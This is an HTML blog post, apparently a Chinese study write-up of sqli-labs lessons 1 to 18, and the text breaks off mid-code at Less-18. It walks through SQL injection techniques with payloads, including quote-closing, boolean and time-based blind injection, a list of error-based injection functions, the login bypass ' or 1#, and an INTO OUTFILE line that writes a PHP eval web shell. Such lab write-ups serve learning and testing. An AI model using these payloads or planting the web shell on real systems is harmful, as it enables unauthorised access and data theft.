@@ -1,0 +1,345 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sqli_labs less0-22 | Kenoeee</title><meta name="keywords" content="-web"><meta name="author" content="Kenoeee"><meta name="copyright" content="Kenoeee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Sqli_labsLess0-22首先是sqli_labs的安装需要几点注意  修改配置里面的数据库用户密码 php版本应该为5 php.ini里面魔术引号关掉  前置知识数据库的组成结构：库-&gt;database 表-&gt;table 列-&gt;column（acess没有多个库） sqli_labs针对的是mysql的注入，但是其实数据库都有着类似的结构，以下是针对mysql的一些常规">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli_labs less0-22">
+<meta property="og:url" content="http://example.com/2022/02/06/sqlI_labs%2001/index.html">
+<meta property="og:site_name" content="Kenoeee">
+<meta property="og:description" content="Sqli_labsLess0-22首先是sqli_labs的安装需要几点注意  修改配置里面的数据库用户密码 php版本应该为5 php.ini里面魔术引号关掉  前置知识数据库的组成结构：库-&gt;database 表-&gt;table 列-&gt;column（acess没有多个库） sqli_labs针对的是mysql的注入，但是其实数据库都有着类似的结构，以下是针对mysql的一些常规">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg">
+<meta property="article:published_time" content="2022-02-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-02-08T07:24:55.222Z">
+<meta property="article:author" content="Kenoeee">
+<meta property="article:tag" content="-web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/06/sqlI_labs%2001/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqli_labs less0-22',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-08 15:24:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/20220128021634.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kenoeee</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqli_labs less0-22</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-05T16:00:00.000Z" title="发表于 2022-02-06 00:00:00">2022-02-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-08T07:24:55.222Z" title="更新于 2022-02-08 15:24:55">2022-02-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqli_labs less0-22"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Sqli-labsLess0-22"><a href="#Sqli-labsLess0-22" class="headerlink" title="Sqli_labsLess0-22"></a>Sqli_labsLess0-22</h1><p>首先是sqli_labs的安装需要几点注意</p>
+<ul>
+<li>修改配置里面的数据库用户密码</li>
+<li>php版本应该为5</li>
+<li>php.ini里面魔术引号关掉</li>
+</ul>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>数据库的组成结构：库-&gt;database 表-&gt;table 列-&gt;column（acess没有多个库）</p>
+<p>sqli_labs针对的是mysql的注入，但是其实数据库都有着类似的结构，以下是针对mysql的一些常规操作</p>
+<ul>
+<li>select database();     //查看当前所用的数据库</li>
+<li>select table_name from information_schema.tables where table_name=database();       //查看当前数据库的所有表名</li>
+<li>select column_name from information_schema.columns where table_name=’xxx’;          //查看某个表里面的所有列名</li>
+<li>order by x;      //这个x可以是列名也可以是数字，数字就表示是第几列的意思</li>
+</ul>
+<p>这里要解释一下information_schema里面的结构,information_schema是mysql中一个重要的表，原来记录一些重要的信息，里面有许多表，我们只需要记住几个常用的</p>
+<ul>
+<li>TABLES -&gt;TABLE_NAME(表名)；TABLE_SCHEMA(表对应的库名)；</li>
+<li>COLUMNS-&gt;TABLE_SCHEMA(列所在表对应的库名);TABLE_NAME（列所在的表名);COLUMN_NAME(字段名)</li>
+</ul>
+<h2 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h2><ul>
+<li>报错注入</li>
+</ul>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>尝试地传一个?id=1’，页面报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220202143733.png"></p>
+<p>报错显示 <strong>use near ‘’1’’ LIMIT 0,1’ at line 1</strong></p>
+<p>可以知道构造的sql语句是 ‘1’’ LIMIT 0,1 可以发现这里的参数是被一对单引号括住的，这样子我们根据报错的内容得到了sql语句，我们就可以尝试去闭合原来的单引号的基础上去构造我们想要的sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#原本的sql语句应该是</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1</span><br><span class="line">#因此我们要尝试闭合前面的单引号，然后添加我们的sql语句，然后注释掉后面的单引号，可以尝试构造</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;-1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br><span class="line">#这样子虽然id=-1这个条件是错误的 但是由于后面的1=1恒成立，所以依然会进行查询得到表里第一列的内容，这里是采用了闭合了后面的单引号的方式，我们还可以使用注释的方法</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27;-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>注释可以用– 或者# 像第一关是url里面传参，要经过url编码，所以可以使用</p>
+<p>–+ 因为+解码后会变成空格</p>
+<p>接下来可以爆列数，使用order by，发现刚好order by 3的时候不会报错</p>
+<p>传一个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220202155251.png"></p>
+<p>发现了爆出的数据的点，于是我们可以组织一下我们的payload了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220202155402.png"></p>
+<p>顺利查到表名，接下来想查啥都好说了</p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220202155557.png"></p>
+<p>可以知道没有单引号，所以就 把第一关的payload去掉一个单引号就行</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220202155901.png"></p>
+<p>这里用的是’)</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220202160114.png"></p>
+<p>“)</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>到了这里就是布尔盲注了</p>
+<p>说到布尔盲注，我们需要记住几个常见的字符串处理函数</p>
+<ul>
+<li>mid(string,start,length)</li>
+</ul>
+<blockquote>
+<p>str=”12345”     mid(str,2,1)    输出2</p>
+</blockquote>
+<ul>
+<li>substr(string,start,length)</li>
+</ul>
+<p>用法和mid一样</p>
+<ul>
+<li>left(string,length)</li>
+</ul>
+<blockquote>
+<p>str=”12345” left(str,2)    输出12</p>
+</blockquote>
+<ul>
+<li>ord(str)</li>
+</ul>
+<blockquote>
+<p>得到返回第一个字符的ASCII</p>
+</blockquote>
+<ul>
+<li>ascii()    和ord一样</li>
+</ul>
+<p>当我们传入id=1的时候 页面没有回显账户的信息，只会给一个正确登录的提示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220204150713.png"></p>
+<p>这个时候我们可以传一个错误的and运算就可以知道盲注的基本思想</p>
+<p><img src="C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20220204150800317.png" alt="image-20220204150800317"></p>
+<p>当我们在and后面传入错误的运算时，页面没有正确的回显，于是我们可以在and后面加入一些判断语句，例如判断数据库长度大小的，由于我们事先知道数据库的名字为security，长度为8</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220204151041.png"></p>
+<p>我们还可以继续去爆库名，比如</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220204151339.png"></p>
+<p>知道第一个字符是s后就可以继续往下爆，这里一般都是用sqlmap批量跑，在misc题目也经常会遇到sqlmap的盲注流量题</p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>payload去掉’</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>payload加上’))，看标题写着dump into outfile</p>
+<ul>
+<li>load_file() 读取文件并返回该文件的内容作为一个字符串</li>
+<li>select <?php @eval($_REQUEST[1])?> into outfile “绝对路径\1.php”      写入一个一句话木马</li>
+<li>Lines terminated by         //在每行结束的位置添加内容</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;d:/xx/xx/xx/shell.php&#x27;</span> lines terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php @eval($_REQUEST[1])?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Lines starting by          //在每行开始的位置添加内容</li>
+<li>fieids terminated by      //在每个字段的间隔中插入内容</li>
+<li>colomns terminated by     //在每个字段的位置添加内容</li>
+</ul>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>payload加上’</p>
+<h3 id="常见报错函数"><a href="#常见报错函数" class="headerlink" title="常见报错函数"></a>常见报错函数</h3><p>这里补充一下除布尔盲注之外的盲注，例如基于报错的盲注，报错往往是一些函数的特性导致，在利用报错盲注的时候要特别注意php版本，在最开始学习报错盲注的时候就在这里浪费了很多时间，这里记录一些常见的报错函数</p>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floor()的功能是向下取整，返回一个不大于x的最大整数，例如floor(1.2)=1</p>
+<p>一般配合rand()使用，是一个随机数函数，会随机生成一个0到1直接的数</p>
+<p>当rand()有了参数之后，它会对所查询的每条数据产生一个随机数，但是从时间角度看每次给的随机数值是一样的，所以这个随机数的可以预测的，也叫伪随机数</p>
+<p>而floor(rand(0)*2)会生成0或者1的数，当它和group by一起用的时候，会进行多次运算，可以知道floor(rand(0)*2)会得到011011的序列</p>
+<blockquote>
+<p>当在<strong>group by</strong> 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，**<code>floor(rand(0)\*2)</code>**再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后<code>floor(rand(0)*2)</code>又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错！</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">参考资料</a></p>
+<p>利用payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(), concat((<span class="keyword">select</span> database()), <span class="string">&#x27;-&#x27;</span>, <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
+
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>从目标XML中返回包含所查询值的字符串，MySQL5.1.5以上版本才支持</p>
+<p>EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p>
+<blockquote>
+<p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容</p>
+</blockquote>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220204164452.png"></p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;~&#x27;</span>),<span class="number">3</span>);</span><br><span class="line">updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220204164737.png"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>exp函数如果里面的数值大于709的时候，会溢出报错</p>
+<p>适用于mysql5.5.5及以上版本，这个报错对版本有高要求，很容易失败</p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure>
+
+<h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><p> geometrycollection(point(10 10), point(30 30), linestring(15 15, 20 20))</p>
+<p>报错原理：MYSQL无法用这样字符串画出图形</p>
+<p>5.5&lt;MYSQL版本&lt;5.6</p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint ()"></a>multipoint ()</h4><p>Multipoint (inputs, {spatial_reference}, {has_z}, {has_m})</p>
+<p>报错原理和上面那个一样</p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> database())a)b));</span><br></pre></td></tr></table></figure>
+
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><p>和上面一样</p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> database())a)b));</span><br></pre></td></tr></table></figure>
+
+<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>标题是时间盲注</p>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><ul>
+<li>sleep(seconds)函数，里面数字多大就睡几秒，因此可以构造以下payload根据页面响应的时间来判断</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(substr(<span class="keyword">select</span> database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库名第一个字符是s的话页面就会卡5秒</p>
+<ul>
+<li>BENCHMARK()</li>
+</ul>
+<p>BENCHMARK(count,expr),该函数会重复执行表达式expr count次，payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;union select (if(substr(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,BEN CHMARK(50000000,ENCODE(&#x27;</span>MSG<span class="string">&#x27;,&#x27;</span><span class="keyword">by</span> <span class="number">5</span> seconds<span class="string">&#x27;))))--+</span></span><br></pre></td></tr></table></figure>
+
+<p>若第一个字符是s页面会卡5秒</p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>和上一关一样，差别在于双引号</p>
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>到了这里就是POST的注入了</p>
+<p>这里介绍一下常用的万能密码</p>
+<blockquote>
+<p>‘ or 1#</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205051254.png"></p>
+<p>这里可能还是看不明白，我们结合一下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+
+<p>根据我们传入的值，最后执行的sql语句会变成</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$passwd<span class="string">&#x27; LIMIT 0,1;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现先闭合了前面的单引号，然后用一个or 1构成永真式，再用#注释掉后面的内容，数据库就会返回结果，填在密码那里同样可行，同时又因为登录失败会返回错误信息，前面所学的报错函数在这里也可以用上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205052151.png"></p>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205052648.png"></p>
+<p>爆出以”)闭合 修改前面的payload就可以</p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>双查询报错，其实和前面的是一个道理，直接看payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205054115.png"></p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>和13一样，区别在于没有)</p>
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>没有报错提示，可以利用布尔或者延时盲注</p>
+<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>和15一样</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这次是一个修改密码的功能，看源码知道对用户名进行了函数保护</p>
+<p>所以我们要在password进行报错函数的使用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img@master/img/20220205060859.png"></p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>直接看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, 